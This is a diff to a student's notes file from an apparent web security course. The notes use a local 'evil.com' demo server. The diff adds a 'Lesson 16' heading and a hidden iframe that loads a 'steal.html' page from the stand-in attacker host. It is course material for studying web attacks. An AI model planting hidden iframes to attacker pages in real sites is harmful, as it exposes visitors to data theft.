@@ -17,7 +17,14 @@ From the repository link in the above section, did the following:
 - Ran `npm run start:evil.com` and verified `https://evil.com:666`.
 - Notes from each lessons follows in reverse chronological order.
 - [Git hub repo](https://github.com/carltonj2000/web-sec-ess)
-  created with all content note above.
+
+## Lesson 16
+
+---
+
+<iframe hidden src="https://evil.com:666/steal.html"></iframe>
+
+--- created with all content note above.
 
 ## Lesson 14
 
